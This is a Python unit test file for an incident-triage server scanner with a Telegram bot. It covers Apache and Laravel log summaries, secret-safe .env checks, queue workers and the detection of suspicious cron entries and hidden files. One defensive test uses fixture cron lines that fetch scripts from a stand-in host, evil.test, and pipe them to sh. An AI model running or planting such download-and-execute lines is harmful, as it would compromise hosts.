import stat
import unittest
from types import SimpleNamespace
from unittest.mock import patch

from matrix_scanner.scanners import incident
from matrix_scanner.telegram_bot import available_commands, build_help_text, command_keyboard, command_group_for_command, submenu_keyboard
from matrix_scanner.tool_registry import build_registry
from matrix_scanner.tools.incident import apache_5xx_summary, supervisor_summary


class IncidentToolsTests(unittest.TestCase):
    def test_apache_error_summary_works_when_apache_missing(self):
        result = incident.apache_error_summary(["missing-apache-error.log"], 20)

        self.assertEqual(result["status"], "ok")
        self.assertEqual(result["groups"], [])

    def test_supervisor_summary_works_when_supervisor_missing(self):
        with patch("matrix_scanner.scanners.incident.shutil.which", return_value=None):
            result = incident.supervisor_summary(["missing-supervisor/*.conf"])

        self.assertEqual(result["status"], "ok")
        self.assertFalse(result["available"])

    def test_laravel_env_sanity_handles_missing_env(self):
        config = {"applications": [{"service_name": "app", "path": "missing-app"}]}

        result = incident.laravel_env_sanity(config)

        self.assertEqual(result["rows"][0]["env_exists"], False)
        self.assertEqual(result["rows"][0]["values"], {})

    def test_application_paths_ignores_non_dict_entries(self):
        result = incident._application_paths({"applications": ["[]", [], {"path": "/app", "service_name": "app"}]})

        self.assertEqual(result, [{"service_name": "app", "path": "/app"}])

    def test_laravel_log_health_handles_empty_applications(self):
        result = incident.laravel_log_health({"applications": []})

        self.assertEqual(result["message"], "No Laravel applications configured.")

    def test_laravel_log_health_uses_laravel_path_fallback(self):
        result = incident.laravel_log_health({"applications": ["[]"], "laravel": {"path": "missing-laravel"}})

        self.assertEqual(result["rows"][0]["path"], "missing-laravel")

    def test_laravel_env_sanity_does_not_print_secrets(self):
        with patch("matrix_scanner.scanners.incident._application_paths", return_value=[{"path": "/app"}]):
            with patch("matrix_scanner.scanners.incident._read_lines", return_value=["APP_ENV=production", "APP_DEBUG=false", "DB_PASSWORD=secret", "API_KEY=abc"]):
                result = incident.laravel_env_sanity({})

        values = result["rows"][0]["values"]
        self.assertEqual(values["APP_ENV"], "production")
        self.assertNotIn("DB_PASSWORD", values)
        self.assertNotIn("API_KEY", values)

    def test_suspicious_cron_scan_detects_base64_curl_wget(self):
        with patch("matrix_scanner.scanners.incident._read_lines", return_value=["* * * * * curl http://evil.test/x.sh | base64 -d | sh", "* * * * * wget http://evil.test/y.sh -O- | sh"]):
            result = incident.suspicious_cron_scan(["root-cron"])

        reasons = " ".join(item["reasons"] for item in result["findings"])
        self.assertIn("base64", reasons)
        self.assertIn("تحميل سكريبت خارجي", reasons)

    def test_suspicious_files_scan_detects_hidden_executable_and_immutable(self):
        fake = FakePath("/tmp/.systemd", executable=True)
        immutable = FakePath("/var/tmp/.cache", executable=False)

        with patch("matrix_scanner.scanners.incident._glob", return_value=[fake, immutable]):
            with patch("matrix_scanner.scanners.incident._has_immutable", side_effect=lambda path: path is immutable):
                result = incident.suspicious_files_scan(["/tmp/.*"])

        self.assertEqual(len(result["findings"]), 2)
        self.assertTrue(result["findings"][0]["executable"])
        self.assertTrue(result["findings"][1]["immutable"])

    def test_apache_5xx_summary_groups_by_endpoint(self):
        lines = [
            '198.51.100.1 - - [24/May/2026:10:00:00 +0000] "GET /api/a HTTP/1.1" 500 12 "-" "UA1"',
            '198.51.100.2 - - [24/May/2026:10:00:01 +0000] "GET /api/a HTTP/1.1" 502 12 "-" "UA2"',
            '198.51.100.3 - - [24/May/2026:10:00:02 +0000] "POST /api/b HTTP/1.1" 504 12 "-" "UA3"',
        ]
        with patch("matrix_scanner.scanners.incident._read_many_logs_with_sources", return_value=[("domlog", line) for line in lines]):
            result = incident.apache_5xx_summary(["domlog"], 100)

        endpoints = {(row["status"], row["endpoint"]): row["count"] for row in result["rows"]}
        self.assertEqual(endpoints[("500", "/api/a")], 1)
        self.assertEqual(endpoints[("502", "/api/a")], 1)
        self.assertEqual(endpoints[("504", "/api/b")], 1)

    def test_apache_5xx_summary_reads_multiple_domlogs(self):
        lines = [
            ("/etc/apache2/logs/domlogs/example.com", '198.51.100.1 - - [24/May/2026:10:00:00 +0000] "GET /api/a?x=1 HTTP/1.1" 500 12 "-" "UA1"'),
            ("/etc/apache2/logs/domlogs/example.com-ssl_log", '198.51.100.2 - - [24/May/2026:10:01:00 +0000] "GET /api/a HTTP/1.1" 500 12 "-" "UA2"'),
        ]
        with patch("matrix_scanner.scanners.incident._read_many_logs_with_sources", return_value=lines):
            result = incident.apache_5xx_summary(["/etc/apache2/logs/domlogs"], 100)

        row = result["rows"][0]
        self.assertEqual(row["endpoint"], "/api/a")
        self.assertEqual(row["domain"], "example.com")
        self.assertEqual(row["latest_timestamp"], "24/May/2026:10:01:00 +0000")

    def test_laravel_exception_summary_classifies_common_errors(self):
        lines = [
            "[2026-05-24 10:00:00] production.ERROR: JWT invalid token Bearer null",
            "[2026-05-24 10:00:01] production.ERROR: SQLSTATE[40001]: Deadlock found",
            "[2026-05-24 10:00:02] production.ERROR: SQLSTATE[42S22]: Unknown column 'foo'",
        ]
        with patch("matrix_scanner.scanners.incident._laravel_log_paths_with_apps", return_value=[{"app_path": "/app", "log_path": "laravel.log"}]):
            with patch("matrix_scanner.scanners.incident._tail_lines", return_value=lines):
                result = incident.laravel_exception_summary({}, 100)

        types = {group["type"] for group in result["groups"]}
        self.assertIn("jwt_invalid_token", types)
        self.assertIn("sql_deadlock", types)
        self.assertIn("unknown_column", types)

    def test_laravel_exception_summary_extracts_latest_timestamp(self):
        lines = [
            "[2026-05-24 10:00:00] production.ERROR: JWT invalid token Bearer null",
            "#0 /app/vendor/framework.php",
            "[2026-05-24 10:15:00] production.ERROR: JWT invalid token Bearer null",
        ]
        with patch("matrix_scanner.scanners.incident._laravel_log_paths_with_apps", return_value=[{"app_path": "/home/user/public_html", "log_path": "laravel.log"}]):
            with patch("matrix_scanner.scanners.incident._tail_lines", return_value=lines):
                result = incident.laravel_exception_summary({}, 100)

        group = result["groups"][0]
        self.assertEqual(group["latest_timestamp"], "2026-05-24 10:15:00")
        self.assertEqual(group["affected_app_paths"], {"/home/user/public_html": 2})

    def test_queue_workers_summary_warns_multiple_database_workers_same_app(self):
        rows = [
            {"pid": "1", "user": "innvi", "args": "php /home/innvi/public_html/artisan queue:work database"},
            {"pid": "2", "user": "innvi", "args": "php /home/innvi/public_html/artisan queue:work database"},
        ]
        with patch("matrix_scanner.scanners.incident.top_processes", return_value={"rows": rows}):
            result = incident.queue_workers_summary()

        self.assertEqual(result["groups"][0]["count"], 2)
        self.assertTrue(any("Multiple workers on database queue" in warning for warning in result["warnings"]))

    def test_tool_wrappers_work_when_apache_and_supervisor_missing(self):
        self.assertIn("لا توجد", apache_5xx_summary({"config": {"apache": {"access_logs": ["missing"]}, "logs": {"max_lines": 20}}})["summary_text"])
        self.assertIn("Supervisor", supervisor_summary({"config": {"supervisor": {"config_paths": ["missing/*.conf"]}}})["summary_text"])

    def test_telegram_menu_shows_new_tools_when_enabled(self):
        registry = build_registry()
        config = {"telegram": {"allowed_user_ids": [123], "allowed_chat_ids": []}}
        commands = available_commands(registry, config)
        main_keyboard = [command for row in command_keyboard(registry, config)["keyboard"] for command in row]
        help_text = build_help_text(registry, config)

        self.assertIn("🖥 Server", main_keyboard)
        self.assertIn("🌐 Web / Logs", main_keyboard)
        for command in ["/top", "/apache", "/5xx", "/queue", "/supervisor", "/cron", "/suspicious"]:
            self.assertIn(command, commands)
            group = command_group_for_command(command, registry, config)
            submenu = [item for row in submenu_keyboard(group, registry, config)["keyboard"] for item in row]
            self.assertIn(command, submenu)
        self.assertIn("اختر قسمًا", help_text)


class FakePath:
    def __init__(self, path: str, *, executable: bool):
        self._path = path
        self.name = path.rsplit("/", 1)[-1]
        self._mode = stat.S_IFREG | (stat.S_IXUSR if executable else 0)

    def is_file(self):
        return True

    def stat(self):
        return SimpleNamespace(st_mode=self._mode)

    def __str__(self):
        return self._path


if __name__ == "__main__":
    unittest.main()
